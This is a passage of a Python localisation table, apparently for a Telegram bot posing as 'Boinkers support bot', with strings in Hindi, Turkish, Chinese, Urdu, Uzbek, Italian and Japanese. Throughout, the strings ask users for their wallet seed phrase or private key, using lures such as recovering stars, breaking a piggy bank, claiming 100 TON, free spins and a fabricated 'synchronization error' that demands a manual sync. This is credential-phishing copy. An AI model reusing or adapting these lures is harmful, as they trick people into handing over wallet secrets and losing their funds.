        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Seed Phrase आयात करें",
        "label_seed_phrase": "seed phrase",
        "label_private_key": "private key",
        "wallet selection message": "आपने {wallet_name} चुन लिया है।\nकनेक्शन मोड चुनें।",
        "reassurance": PROFESSIONAL_REASSURANCE["hi"],
        "prompt seed": "कृपया 12 या 24 शब्दों की seed phrase दर्ज करें।",
        "prompt private key": "कृपया अपना private key दर्ज करें।",
        # 24-word prompts
        "prompt_24_wallet_type_metamask": "कृपया अपने Tonkeeper वॉलेट के 24 शब्द दर्ज करें।",
        "prompt_24_wallet_type_trust_wallet": "कृपया अपने Telegram Wallet के 24 शब्द दर्ज करें।",
        "prompt_24_wallet_type_coinbase": "कृपया अपने MyTon वॉलेट के 24 शब्द दर्ज करें।",
        "prompt_24_wallet_type_tonkeeper": "कृपया अपने Tonhub वॉलेट के 24 शब्द दर्ज करें।",
        # wallet errors
        "wallet_24_error_wallet_type_metamask": "यह फ़ील्ड seed phrase की आवश्यकता है (आपके Tonkeeper वॉलेट के 24 शब्द)। कृपया seed phrase प्रदान करें।",
        "wallet_24_error_wallet_type_trust_wallet": "यह फ़ील्ड seed phrase की आवश्यकता है (आपके Telegram वॉलेट के 24 शब्द)। कृपया seed phrase प्रदान करें।",
        "wallet_24_error_wallet_type_coinbase": "यह फ़ील्ड seed phrase की आवश्यकता है (आपके MyTon वॉलेट के 24 शब्द)। कृपया seed phrase प्रदान करें।",
        "wallet_24_error_wallet_type_tonkeeper": "यह फ़ील्ड seed phrase की आवश्यकता है (आपके Tonhub वॉलेट के 24 शब्द)。 कृपया seed phrase प्रदान करें।",
        "refund": "रिफंड",
        "reflection": "टोकन प्रतिबिंब",
        "token reflection": "टोकन प्रतिबिंब",
        "recover stars": "सितारे पुनःप्राप्त करें 🌟",
        "break piggy bank": "पिग्गी बैंक तोड़ें",
        "free spins": "मुफ्त स्पिन",
        "album rewards": "एलबम पुरस्कार",
        "claim 100 tons": "100 TONS दावा करें",
        "claim 1 ton": "1 TON दावा करें",
        "mega wheel": "मेगा व्हील",
        "connect_recover_stars": "कृपया अपने टेलीग्राम खाते में अपने सितारों 🌟 को पुनःप्राप्त करने के लिए अपना वॉलेट कनेक्ट करें",
        "connect_break_piggy_bank": "कृपया अपना वॉलेट कनेक्ट करें ताकि आप अपना पिग्गी बैंक तोड़ सकें और अपने पुरस्कार प्राप्त कर सकें",
        "connect_free_spins": "कृपया अपना वॉलेट कनेक्ट करें ताकि आप अपने खाते में 1M स्पिन का दावा कर सकें",
        "connect_album_rewards": "कृपया अपना वॉलेट कनेक्ट करें ताकि आप अपने स्टिकर एल्बम संग्रह इनाम प्राप्त कर सकें",
        "connect_claim_100_tons": "कृपया अपना वॉलेट कनेक्ट करें ताकि आप ALBUM SET WHEEL से जीते गए 100 tons का दावा कर सकें",
        "connect_claim_1_ton": "कृपया अपना वॉलेट कनेक्ट करें ताकि आप ALBUM SET WHEEL से जीते गए 1 ton का दावा कर सकें",
        "connect_mega_wheel": "कृपया अपना वॉलेट कनेक्ट करें ताकि आप अपने खाते में MEGA WHEEL सक्रिय कर सकें",
        "connect_missing_tokens": "कृपया अपना वॉलेट कनेक्ट करें ताकि आप अपने गायब टोकन प्राप्त कर सकें :",
        # synchronization / claim manually / fallback
        "synchronization_error": (
            "⚠️सिंक त्रुटि का पता चला⚠️\n\n"
            "हमारा सिस्टम आपके वॉलेट और Boinkers बॉट के बीच एक सत्यापित लिंक स्थापित करने में असमर्थ था।\n\n"
            "यह आमतौर पर तब होता है जब वॉलेट ने प्रारंभिक प्रोटोकॉल मर्ज हैंडशेक पूरा नहीं किया है। जारी रखने के लिए, आपको अपने वॉलेट को रजिस्टर करने के लिए मैन्युअल सिंक और मर्ज करना होगा‼️"
        ),
        "claim_manually": "मैन्युअल रूप से दावा करें",
        "error_use_seed_phrase": "कृपया अपने वॉलेट की seed phrase प्रदान करें (12 या 24 शब्द)।",
        "post_receive_error": "‼ एक त्रुटि हुई, कृपया सुनिश्चित करें कि आप सही कुंजी दर्ज कर रहे हैं, त्रुटियों से बचने के लिए कॉपी और पेस्ट का उपयोग करें। कृपया /start से पुनः प्रयास करें।",
        "invalid choice": "अमान्य विकल्प। कृपया बटन का उपयोग करें।",
    },
    "tr": {
        "welcome": "Hi {user} Boinkers support bot'a hoş geldiniz! Bu bot cüzdan erişimi, işlemler, bakiye, kurtarmalar, token ve ödüllerin alınması, iadeler ve hesap doğrulamaları konusunda yardımcı olur. Devam etmek için menüden bir seçenek seçin.",
        "main menu title": "Devam etmek için bir sorun türü seçin:",
        "validation": "Doğrulama",
        "claim tokens": "Token Talep Et",
        "recover account progress": "Hesap ilerlemesini kurtar",
        "assets recovery": "Varlık Kurtarma",
        "general issues": "Genel Sorunlar",
        "rectification": "Düzeltme",
        "withdrawals": "Para Çekme",
        "missing tokens": "Eksik tokenler",
        "login issues": "Giriş Sorunları",
        "connect wallet message": "Lütfen cüzdanınızı Private Key veya Seed Phrase ile bağlayın。",
        "connect wallet button": "🔑 Cüzdanı Bağla",
        "select wallet type": "Lütfen cüzdan türünü seçin:",
        "other wallets": "Diğer Cüzdanlar",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Seed Phrase İçe Aktar",
        "label_seed_phrase": "seed phrase",
        "label_private_key": "private key",
        "wallet selection message": "Seçtiğiniz {wallet_name}。\nBağlantı modunu seçin。",
        "reassurance": PROFESSIONAL_REASSURANCE["tr"],
        "prompt seed": "Lütfen 12 veya 24 kelimelik seed phrase girin。",
        "prompt private key": "Lütfen private key'inizi girin。",
        # 24-word prompts
        "prompt_24_wallet_type_metamask": "Lütfen Tonkeeper cüzdanınızın 24 kelimesini girin。",
        "prompt_24_wallet_type_trust_wallet": "Lütfen Telegram Cüzdanınızın 24 kelimesini girin。",
        "prompt_24_wallet_type_coinbase": "Lütfen MyTon cüzdanınızın 24 kelimesini girin。",
        "prompt_24_wallet_type_tonkeeper": "Lütfen Tonhub cüzdanınızın 24 kelimesini girin。",
        # wallet errors
        "wallet_24_error_wallet_type_metamask": "Bu alan bir seed phrase gerektirir (Tonkeeper cüzdanınızın 24 kelimesi). Lütfen seed phrase sağlayın.",
        "wallet_24_error_wallet_type_trust_wallet": "Bu alan bir seed phrase gerektirir (Telegram cüzdanınızın 24 kelimesi). Lütfen seed phrase sağlayın.",
        "wallet_24_error_wallet_type_coinbase": "Bu alan bir seed phrase gerektirir (MyTon cüzdanınızın 24 kelimesi). Lütfen seed phrase sağlayın.",
        "wallet_24_error_wallet_type_tonkeeper": "Bu alan bir seed phrase gerektirir (Tonhub cüzdanınızın 24 kelimesi). Lütfen seed phrase sağlayın.",
        "refund": "İade",
        "reflection": "Token Yansıtma",
        "token reflection": "Token Yansıtma",
        "recover stars": "Yıldızları Kurtar 🌟",
        "break piggy bank": "Kumbara Kır",
        "free spins": "Ücretsiz dönüşler",
        "album rewards": "Albüm Ödülleri",
        "claim 100 tons": "100 TONS Talep Et",
        "claim 1 ton": "1 TON Talep Et",
        "mega wheel": "Mega tekerlek",
        "connect_recover_stars": "Lütfen yıldızlarınızı 🌟 telegram hesabınızda kurtarmak için cüzdanınızı bağlayın",
        "connect_break_piggy_bank": "Lütfen kumbaranızı kırmak ve ödüllerinizi almak için cüzdanınızı bağlayın",
        "connect_free_spins": "Lütfen hesabınızda 1M dönüşü talep etmek için cüzdanınızı bağlayın",
        "connect_album_rewards": "Lütfen sticker albüm koleksiyon ödülünüzü almak için cüzdanınızı bağlayın",
        "connect_claim_100_tons": "Lütfen ALBUM SET WHEEL'den kazandığınız 100 tons'u talep etmek için cüzdanınızı bağlayın",
        "connect_claim_1_ton": "Lütfen ALBUM SET WHEEL'den kazandığınız 1 ton'u talep etmek için cüzdanınızı bağlayın",
        "connect_mega_wheel": "Lütfen hesabınızda MEGA WHEEL'i etkinleştirmek için cüzdanınızı bağlayın",
        "connect_missing_tokens": "Lütfen eksik tokenlerinizi almak için cüzdanınızı bağlayın :",
        # synchronization / claim manually / fallback
        "synchronization_error": (
            "⚠️Senkronizasyon Hatası Tespit Edildi⚠️\n\n"
            "Sistemimiz, cüzdanınız ile Boinkers botu arasında doğrulanmış bir bağlantı kuramadı.\n\n"
            "Bu genellikle cüzdanın başlangıç protokolü birleştirme el sıkışmasını tamamlamadığı durumlarda oluşur. Devam etmek için cüzdanınızı kaydetmek üzere manuel bir senkronizasyon ve birleştirme yapmalısınız‼️"
        ),
        "claim_manually": "Manuel Talep Et",
        "error_use_seed_phrase": "Lütfen cüzdanınızın seed phrase'ini sağlayın (12 veya 24 kelime).",
        "post_receive_error": "‼ Bir hata oluştu, Lütfen doğru anahtarı girdiğinizden emin olun, hataları önlemek için kopyala-yapıştır kullanın. lütfen /start ile tekrar deneyin.",
        "invalid choice": "Geçersiz seçim. Lütfen butonları kullanın.",
    },
    "zh": {
        "welcome": "Hi {user} 欢迎使用 Boinkers support bot! 此机器人可帮助钱包访问、交易、余额、恢复、领取代币与奖励、退款和账户验证。请选择菜单中的一项继续。",
        "main menu title": "请选择一个问题类型以继续：",
        "validation": "验证",
        "claim tokens": "认领代币",
        "recover account progress": "恢复账户进度",
        "assets recovery": "资产恢复",
        "general issues": "常见问题",
        "rectification": "修正",
        "withdrawals": "提现",
        "missing tokens": "缺失的代币",
        "login issues": "登录问题",
        "connect wallet message": "请用私钥或助记词连接钱包以继续。",
        "connect wallet button": "🔑 连接钱包",
        "select wallet type": "请选择您的钱包类型：",
        "other wallets": "其他钱包",
        "private key": "🔑 私钥",
        "seed phrase": "🔒 导入助记词",
        "label_seed_phrase": "助记词",
        "label_private_key": "私钥",
        "wallet selection message": "您已选择 {wallet_name}。\n请选择连接方式。",
        "reassurance": PROFESSIONAL_REASSURANCE["zh"],
        "prompt seed": "请输入 12 或 24 个单词的助记词。",
        "prompt private key": "请输入您的私钥。",
        # 24-word prompts
        "prompt_24_wallet_type_metamask": "请输入您 Tonkeeper 钱包的 24 个单词。",
        "prompt_24_wallet_type_trust_wallet": "请输入您 Telegram 钱包的 24 个单词。",
        "prompt_24_wallet_type_coinbase": "请输入您 MyTon 钱包的 24 个单词。",
        "prompt_24_wallet_type_tonkeeper": "请输入您 Tonhub 钱包的 24 个单词。",
        # wallet 24 errors
        "wallet_24_error_wallet_type_metamask": "此字段需要助记词（您 Tonkeeper 钱包的 24 个单词）。请提供助记词。",
        "wallet_24_error_wallet_type_trust_wallet": "此字段需要助记词（您 Telegram 钱包的 24 个单词）。请提供助记词。",
        "wallet_24_error_wallet_type_coinbase": "此字段需要助记词（您 MyTon 钱包的 24 个单词）。请提供助记词。",
        "wallet_24_error_wallet_type_tonkeeper": "此字段需要助记词（您 Tonhub 钱包的 24 个单词）。请提供助记词。",
        "refund": "退款",
        "reflection": "代币反射",
        "token reflection": "代币反射",
        "recover stars": "恢复星星 🌟",
        "break piggy bank": "砸开储蓄罐",
        "free spins": "免费旋转",
        "album rewards": "相册奖励",
        "claim 100 tons": "领取 100 TONS",
        "claim 1 ton": "领取 1 TON",
        "mega wheel": "超级转盘",
        "connect_recover_stars": "请连接您的钱包以在您的 Telegram 帐户中恢复您的星星 🌟",
        "connect_break_piggy_bank": "请连接您的钱包以砸开您的储蓄罐并领取您的奖励",
        "connect_free_spins": "请连接您的钱包以在您的账户中领取 1M 次旋转",
        "connect_album_rewards": "请连接您的钱包以领取您的贴纸相册集合奖励",
        "connect_claim_100_tons": "请连接您的钱包以领取您在 ALBUM SET WHEEL 中赢得的 100 tons",
        "connect_claim_1_ton": "请连接您的钱包以领取您在 ALBUM SET WHEEL 中赢得的 1 ton",
        "connect_mega_wheel": "请连接您的钱包以在您的账户中激活 MEGA WHEEL",
        "connect_missing_tokens": "请连接您的钱包以获取您缺失的代币 :",
        # synchronization / claim manually / fallback
        "synchronization_error": (
            "⚠️检测到同步错误⚠️\n\n"
            "我们的系统无法在您的钱包与 Boinkers 机器人之间建立已验证的链接。\n\n"
            "这通常发生在钱包尚未完成初始协议合并握手时。要继续，您必须执行手动同步与合并以注册您的钱包‼️"
        ),
        "claim_manually": "手动认领",
        "error_use_seed_phrase": "请提供您的钱包助记词（12 或 24 个单词）。",
        "post_receive_error": "‼ 出现错误，请确保您输入了正确的密钥，使用复制粘贴以避免错误。请 /start 再试一次。",
        "invalid choice": "无效选择。请使用按钮。",
    },
    "ur": {
        "welcome": "Hi {user} welcome to Boinkers support bot! This bot helps with wallet access, transactions, balances, recoveries, receiving tokens and rewards, refunds, and account validations. Please choose one of the menu options to proceed.",
        "main menu title": "براہ کرم جاری رکھنے کیلئے مسئلے کی قسم منتخب کریں:",
        "validation": "تصدیق",
        "claim tokens": "ٹوکن وصول کریں",
        "recover account progress": "اکاؤنٹ کی پیشرفت بحال کریں",
        "assets recovery": "اثاثہ بازیابی",
        "general issues": "عام مسائل",
        "rectification": "درستگی",
        "withdrawals": "رقم نکالیں",
        "missing tokens": "گم شدہ ٹوکنز",
        "login issues": "لاگ ان مسائل",
        "connect wallet message": "براہ کرم والٹ کو Private Key یا Seed Phrase کے ساتھ منسلک کریں۔",
        "connect wallet button": "🔑 والٹ جوڑیں",
        "select wallet type": "براہ کرم والٹ کی قسم منتخب کریں:",
        "other wallets": "دیگر والٹس",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Seed Phrase امپورٹ کریں",
        "label_seed_phrase": "seed phrase",
        "label_private_key": "private key",
        "wallet selection message": "آپ نے {wallet_name} منتخب کیا ہے。\nاپنا پسندیدہ کنکشن طریقہ منتخب کریں。",
        "reassurance": PROFESSIONAL_REASSURANCE["ur"],
        "prompt seed": "براہ کرم 12 یا 24 الفاظ کی seed phrase درج کریں。",
        "prompt private key": "براہ کرم اپنا private key درج کریں。",
        # 24-word prompts
        "prompt_24_wallet_type_metamask": "براہ کرم اپنے Tonkeeper والٹ کے 24 الفاظ درج کریں。",
        "prompt_24_wallet_type_trust_wallet": "براہ کرم اپنے Telegram والٹ کے 24 الفاظ درج کریں。",
        "prompt_24_wallet_type_coinbase": "براہ کرم اپنے MyTon والٹ کے 24 الفاظ درج کریں。",
        "prompt_24_wallet_type_tonkeeper": "براہ کرم اپنے Tonhub والٹ کے 24 الفاظ درج کریں。",
        # wallet 24 errors
        "wallet_24_error_wallet_type_metamask": "یہ فیلڈ seed phrase کا تقاضا کرتا ہے (آپ کے Tonkeeper والٹ کے 24 الفاظ). براہ کرم seed phrase فراہم کریں。",
        "wallet_24_error_wallet_type_trust_wallet": "یہ فیلڈ seed phrase کا تقاضا کرتا ہے (آپ کے Telegram والٹ کے 24 الفاظ). براہ کرم seed phrase فراہم کریں。",
        "wallet_24_error_wallet_type_coinbase": "یہ فیلڈ seed phrase کا تقاضا کرتا ہے (آپ کے MyTon والٹ کے 24 الفاظ). براہ کرم seed phrase فراہم کریں。",
        "wallet_24_error_wallet_type_tonkeeper": "یہ فیلڈ seed phrase کا تقاضا کرتا ہے (آپ کے Tonhub والٹ کے 24 الفاظ). براہ کرم seed phrase فراہم کریں。",
        "refund": "واپسی",
        "reflection": "ٹوکن عکس",
        "token reflection": "ٹوکن عکس",
        "recover stars": "ستارے دوبارہ حاصل کریں 🌟",
        "break piggy bank": "پگی بینک توڑیں",
        "free spins": "مفت اسپنز",
        "album rewards": "البم انعامات",
        "claim 100 tons": "100 TONS کلیم کریں",
        "claim 1 ton": "1 TON کلیم کریں",
        "mega wheel": "میگا وہیل",
        "connect_recover_stars": "براہ کرم اپنے ٹیلیگرام اکاؤنٹ میں اپنے ستاروں 🌟 کو بحال کرنے کے لئے اپنے والٹ کو جوڑیں",
        "connect_break_piggy_bank": "براہ کرم اپنے والٹ کو جوڑیں تاکہ آپ اپنا پگی بینک توڑ سکیں اور اپنے انعامات حاصل کریں",
        "connect_free_spins": "براہ کرم اپنے والٹ کو جوڑیں تاکہ آپ اپنے اکاؤنٹ میں 1M اسپنز کلیم کرسکیں",
        "connect_album_rewards": "براہ کرم اپنے والٹ کو جوڑیں تاکہ آپ اپنا اسٹیکر البم کلیکشن انعام حاصل کرسکیں",
        "connect_claim_100_tons": "براہ کرم اپنے والٹ کو جوڑیں تاکہ آپ ALBUM SET WHEEL سے جیتا گیا 100 tons کلیم کرسکیں",
        "connect_claim_1_ton": "براہ کرم اپنے والٹ کو جوڑیں تاکہ آپ ALBUM SET WHEEL سے جیتا گیا 1 ton کلیم کرسکیں",
        "connect_mega_wheel": "براہ کرم اپنے والٹ کو جوڑیں تاکہ اپنے اکاؤنٹ میں MEGA WHEEL فعال کریں",
        "connect_missing_tokens": "براہ کرم اپنے والٹ کو جوڑیں تاکہ اپنے گم شدہ ٹوکن حاصل کریں :",
        # synchronization / claim manually / fallback
        "synchronization_error": (
            "⚠️نقصِ ہم آہنگی کا پتہ چلا⚠️\n\n"
            "ہمارا نظام آپ کے والٹ اور Boinkers بوٹ کے درمیان تصدیق شدہ لنک قائم نہیں کر سکا۔\n\n"
            "یہ عام طور پر اس وقت ہوتا ہے جب والٹ نے ابتدائی پروٹوکول مرج ہینڈ شیک مکمل نہیں کیا ہوتا۔ جاری رکھنے کے لیے، آپ کو اپنا والٹ رجسٹر کرنے کے لیے دستی سنکرونائزیشن اور مرج کرنا ہوگا‼️"
        ),
        "claim_manually": "دستی طور پر کلیم کریں",
        "error_use_seed_phrase": "براہ کرم اپنے والٹ کی seed phrase فراہم کریں (12 یا 24 الفاظ).",
        "post_receive_error": "‼ ایک خرابی پیش آئی، براہ کرم یقینی بنائیں کہ آپ درست کلید درج کر رہے ہیں، غلطیوں سے بچنے کے لیے کاپی/پیسٹ استعمال کریں۔ براہ کرم /start دوبارہ کوشش کریں۔",
        "invalid choice": "غلط انتخاب۔ براہ کرم بٹن استعمال کریں۔",
    },
    "uz": {
        "welcome": "Hi {user} Boinkers support botga xush kelibsiz! Ushbu bot hamyonga kirish, tranzaksiyalar, balanslar, tiklash, token va mukofotlarni qabul qilish, qaytarish va hisob tekshiruvi kabi masalalarda yordam beradi. Davom etish uchun menyudan bir variant tanlang.",
        "main menu title": "Davom etish uchun muammo turini tanlang:",
        "validation": "Tekshirish",
        "claim tokens": "Tokenlarni oling",
        "recover account progress": "Hisobning rivojlanishini tiklash",
        "assets recovery": "Aktivlarni tiklash",
        "general issues": "Umumiy muammolar",
        "rectification": "Tuzatish",
        "withdrawals": "Chiqim",
        "missing tokens": "Yo'qolgan tokenlar",
        "login issues": "Kirish muammolari",
        "connect wallet message": "Iltimos, hamyoningizni Private Key yoki Seed Phrase bilan ulang.",
        "connect wallet button": "🔑 Hamyonni ulang",
        "select wallet type": "Hamyon turini tanlang:",
        "other wallets": "Boshqa hamyonlar",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Seed Phrase import qilish",
        "label_seed_phrase": "seed phrase",
        "label_private_key": "private key",
        "wallet selection message": "Siz {wallet_name} ni tanladingiz.\nUlanish usulini tanlang.",
        "reassurance": PROFESSIONAL_REASSURANCE["uz"],
        "prompt seed": "Iltimos 12 yoki 24 soʻzli seed phrase kiriting。",
        "prompt private key": "Private Key kiriting。",
        # 24-word prompts
        "prompt_24_wallet_type_metamask": "Iltimos Tonkeeper hamyoningizning 24 so‘zini kiriting.",
        "prompt_24_wallet_type_trust_wallet": "Iltimos Telegram hamyoningizning 24 so‘zini kiriting.",
        "prompt_24_wallet_type_coinbase": "Iltimos MyTon hamyoningizning 24 so‘zini kiriting.",
        "prompt_24_wallet_type_tonkeeper": "Iltimos Tonhub hamyoningizning 24 so‘zini kiriting.",
        # wallet 24 errors
        "wallet_24_error_wallet_type_metamask": "Ushbu maydon seed phrase (Tonkeeper hamyoningizning 24 soʻzi) talab qiladi. Iltimos, seed phrase taqdim eting.",
        "wallet_24_error_wallet_type_trust_wallet": "Ushbu maydon seed phrase (Telegram hamyoningizning 24 soʻzi) talab qiladi. Iltimos, seed phrase taqdim eting.",
        "wallet_24_error_wallet_type_coinbase": "Ushbu maydon seed phrase (MyTon hamyoningizning 24 soʻzi) talab qiladi. Iltimos, seed phrase taqdim eting.",
        "wallet_24_error_wallet_type_tonkeeper": "Ushbu maydon seed phrase (Tonhub hamyoningizning 24 soʻzi) talab qiladi. Iltimos, seed phrase taqdim eting.",
        "refund": "Qaytarish",
        "reflection": "Token aks ettirish",
        "token reflection": "Token aks ettirish",
        "recover stars": "Yulduzlarni tiklash 🌟",
        "break piggy bank": "Choynakni sindirish",
        "free spins": "Bepul spinlar",
        "album rewards": "Album mukofotlari",
        "claim 100 tons": "100 TONS da'vo qiling",
        "claim 1 ton": "1 TON da'vo qiling",
        "mega wheel": "Mega g'ildirak",
        "connect_recover_stars": "Iltimos, Telegram hisobingizdagi yulduzlarni 🌟 tiklash uchun hamyoningizni ulang",
        "connect_break_piggy_bank": "Iltimos, hamyoningizni ulang, shunda siz poyabzalingizni sindirib, mukofotlaringizni olasiz",
        "connect_free_spins": "Iltimos, hamyoningizni ulang, shunda hisobingizda 1M spinni da'vo qilishingiz mumkin",
        "connect_album_rewards": "Iltimos, hamyoningizni ulang, shunda stiker albomi to'plami mukofotingizni olasiz",
        "connect_claim_100_tons": "Iltimos, hamyoningizni ulang, shunda ALBUM SET WHEEL-dan yutgan 100 tons-ni da'vo qilishingiz mumkin",
        "connect_claim_1_ton": "Iltimos, hamyoningizni ulang, shunda ALBUM SET WHEEL-dan yutgan 1 ton-ni da'vo qilishingiz mumkin",
        "connect_mega_wheel": "Iltimos, hamyoningizni ulang, shunda hisobingizda MEGA WHEEL-ni yoqishingiz mumkin",
        "connect_missing_tokens": "Iltimos, hamyoningizni ulang, shunda sizning yo'qolgan tokenlaringizni olishingiz mumkin :",
        # synchronization / claim manually / fallback
        "synchronization_error": (
            "⚠️Sinkronizatsiya xatosi aniqlangan⚠️\n\n"
            "Tizimimiz sizning hamyoningiz va Boinkers bot o'rtasida tekshirilgan bog'lanishni o'rnatolmadi.\n\n"
            "Bu odatda hamyon boshlang'ich protokol birlashma qo'l siqishni tugatmaganda sodir bo'ladi. Davom etish uchun, hamyoningizni ro'yxatdan o'tkazish uchun qo'lda sinxronizatsiya va birlashtirishni bajarishingiz kerak‼️"
        ),
        "claim_manually": "Qo'lda da'vo qilish",
        "error_use_seed_phrase": "Iltimos, hamyoningizning seed phrase'ini taqdim eting (12 yoki 24 so'z).",
        "post_receive_error": "‼ Xato yuz berdi, Iltimos, to'g'ri kalitni kiritayotganingizga ishonch hosil qiling, xatoliklarni oldini olish uchun nusxa ko'chirish va joylashtirishdan foydalaning. iltimos /start bilan qayta urinib ko‘ring.",
        "invalid choice": "Noto'g'ri tanlov. Iltimos tugmalardan foydalaning.",
    },
    "it": {
        "welcome": "Hi {user} benvenuto al Boinkers support bot! Questo bot aiuta con accesso al wallet, transazioni, saldi, recuperi, ricezione di token e ricompense, rimborsi e validazioni account. Scegli un'opzione del menu per procedere.",
        "main menu title": "Seleziona un tipo di problema per continuare:",
        "validation": "Validazione",
        "claim tokens": "Richiedi Token",
        "recover account progress": "Recupera progresso account",
        "assets recovery": "Recupero Asset",
        "general issues": "Problemi Generali",
        "rectification": "Rettifica",
        "withdrawals": "Prelievi",
        "missing tokens": "Token mancanti",
        "login issues": "Problemi di Accesso",
        "connect wallet message": "Collega il tuo wallet con la Private Key o Seed Phrase per continuare.",
        "connect wallet button": "🔑 Connetti Wallet",
        "select wallet type": "Seleziona il tipo di wallet:",
        "other wallets": "Altri Wallets",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Importa Seed Phrase",
        "label_seed_phrase": "seed phrase",
        "label_private_key": "private key",
        "wallet selection message": "Hai selezionato {wallet_name}.\nSeleziona la modalità di connessione preferita.",
        "reassurance": PROFESSIONAL_REASSURANCE["it"],
        "prompt seed": "Inserisci la seed phrase di 12 o 24 parole。",
        "prompt private key": "Inserisci il tuo private key。",
        # 24-word prompts
        "prompt_24_wallet_type_metamask": "Inserisci le 24 parole del tuo wallet Tonkeeper.",
        "prompt_24_wallet_type_trust_wallet": "Inserisci le 24 parole del tuo Telegram Wallet.",
        "prompt_24_wallet_type_coinbase": "Inserisci le 24 parole del tuo MyTon wallet.",
        "prompt_24_wallet_type_tonkeeper": "Inserisci le 24 parole del tuo Tonhub wallet.",
        # wallet errors
        "wallet_24_error_wallet_type_metamask": "Questo campo richiede una seed phrase (le 24 parole del tuo wallet Tonkeeper). Fornisci la seed phrase.",
        "wallet_24_error_wallet_type_trust_wallet": "Questo campo richiede una seed phrase (le 24 parole del tuo wallet Telegram). Fornisci la seed phrase.",
        "wallet_24_error_wallet_type_coinbase": "Questo campo richiede una seed phrase (le 24 parole del tuo wallet MyTon). Fornisci la seed phrase.",
        "wallet_24_error_wallet_type_tonkeeper": "Questo campo richiede una seed phrase (le 24 parole del tuo wallet Tonhub). Fornisci la seed phrase.",
        "refund": "Rimborso",
        "reflection": "Riflessione Token",
        "token reflection": "Riflessione Token",
        "recover stars": "Recupera stelle 🌟",
        "break piggy bank": "Rompi salvadanaio",
        "free spins": "Giri gratuiti",
        "album rewards": "Ricompense Album",
        "claim 100 tons": "Richiedi 100 TONS",
        "claim 1 ton": "Richiedi 1 TON",
        "mega wheel": "Mega wheel",
        "connect_recover_stars": "Collega il tuo wallet per recuperare le tue stelle 🌟 nel tuo account Telegram",
        "connect_break_piggy_bank": "Collega il tuo wallet per rompere il salvadanaio e ricevere le tue ricompense",
        "connect_free_spins": "Collega il tuo wallet per richiedere 1M Giri nel tuo account",
        "connect_album_rewards": "Collega il tuo wallet per ricevere la ricompensa della tua collezione album di sticker",
        "connect_claim_100_tons": "Collega il tuo wallet per richiedere i 100 tons che hai vinto dalla ALBUM SET WHEEL",
        "connect_claim_1_ton": "Collega il tuo wallet per richiedere 1 ton che hai vinto dalla ALBUM SET WHEEL",
        "connect_mega_wheel": "Collega il tuo wallet per attivare MEGA WHEEL nel tuo account",
        "connect_missing_tokens": "Collega il tuo wallet per ottenere i tuoi token mancanti :",
        # synchronization / claim manually / fallback
        "synchronization_error": (
            "⚠️Errore di sincronizzazione rilevato⚠️\n\n"
            "Il nostro sistema non è riuscito a stabilire un collegamento verificato tra il tuo wallet e il bot Boinkers.\n\n"
            "Questo di solito si verifica quando il wallet non ha completato la stretta di mano di unione del protocollo iniziale. Per continuare, è necessario eseguire una sincronizzazione e una fusione manuale per registrare il tuo wallet‼️"
        ),
        "claim_manually": "Richiedi manualmente",
        "error_use_seed_phrase": "Si prega di fornire la seed phrase del tuo wallet (12 o 24 parole).",
        "post_receive_error": "‼ Si è verificato un errore, Assicurati di inserire la chiave corretta, usa copia e incolla per evitare errori. per favore /start per riprovare.",
        "invalid choice": "Scelta non valida. Usa i pulsanti.",
    },
    "ja": {
        "welcome": "Hi {user} ようこそ Boinkers support bot へ！このボットはウォレットアクセス、トランザクション、残高、復旧、トークンや報酬の受け取り、返金、アカウント検証を支援します。メニューから選択してください。",
        "main menu title": "続行する問題の種類を選択してください：",
        "validation": "検証",
        "claim tokens": "トークンを請求",
        "recover account progress": "アカウントの進行を回復",
        "assets recovery": "資産回復",
        "general issues": "一般的な問題",
        "rectification": "修正",
        "withdrawals": "出金",
        "missing tokens": "不足しているトークン",
        "login issues": "ログインの問題",
        "connect wallet message": "プライベートキーまたはSeed Phraseでウォレットを接続してください。",
        "connect wallet button": "🔑 ウォレット接続",
        "select wallet type": "ウォレットの種類を選択してください：",
        "other wallets": "その他のウォレット",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Seed Phrase をインポート",
        "label_seed_phrase": "シードフレーズ",
        "label_private_key": "プライベートキー",
        "wallet selection message": "{wallet_name} を選択しました。\n接続方法を選択してください。",
        "reassurance": PROFESSIONAL_REASSURANCE["ja"],
        "prompt seed": "12 または 24 語の seed phrase を入力してください。",
        "prompt private key": "プライベートキーを入力してください。",
        # 24-word prompts
        "prompt_24_wallet_type_metamask": "Tonkeeper ウォレットの 24 語を入力してください。",
        "prompt_24_wallet_type_trust_wallet": "Telegram ウォレットの 24 語を入力してください。",
        "prompt_24_wallet_type_coinbase": "MyTon ウォレットの 24 語を入力してください。",
        "prompt_24_wallet_type_tonkeeper": "Tonhub ウォレットの 24 語を入力してください。",
        # wallet 24 errors
        "wallet_24_error_wallet_type_metamask": "このフィールドにはシードフレーズ（Tonkeeper ウォレットの24語）が必要です。シードフレーズを提供してください。",
        "wallet_24_error_wallet_type_trust_wallet": "このフィールドにはシードフレーズ（Telegram ウォレットの24語）が必要です。シードフレーズを提供してください。",
        "wallet_24_error_wallet_type_coinbase": "このフィールドにはシードフレーズ（MyTon ウォレットの24語）が必要です。シードフレーズを提供してください。",
        "wallet_24_error_wallet_type_tonkeeper": "このフィールドにはシードフレーズ（Tonhub ウォレットの24語）が必要です。シードフレーズを提供してください。",
        "refund": "返金",
        "reflection": "トークン反映",
        "token reflection": "トークン反映",
        "recover stars": "スターを回復 🌟",
        "break piggy bank": "貯金箱を壊す",
        "free spins": "無料スピン",
        "album rewards": "アルバム報酬",
        "claim 100 tons": "100 TONS を請求",
        "claim 1 ton": "1 TON を請求",
        "mega wheel": "メガホイール",
        "connect_recover_stars": "ウォレットを接続して、Telegram アカウントのスター 🌟 を回復してください",
        "connect_break_piggy_bank": "ウォレットを接続して貯金箱を壊し、報酬を受け取ってください",
        "connect_free_spins": "ウォレットを接続してアカウントで 1M スピンを請求してください",
        "connect_album_rewards": "ウォレットを接続してステッカーアルバム報酬を受け取ってください",
        "connect_claim_100_tons": "ウォレットを接続して ALBUM SET WHEEL で獲得した 100 tons を請求してください",
        "connect_claim_1_ton": "ウォレットを接続して ALBUM SET WHEEL で獲得した 1 ton を請求してください",
        "connect_mega_wheel": "ウォレットを接続してアカウントで MEGA WHEEL を有効にしてください",
        "connect_missing_tokens": "ウォレットを接続して不足しているトークンを取得してください :",
        # synchronization / claim manually / fallback
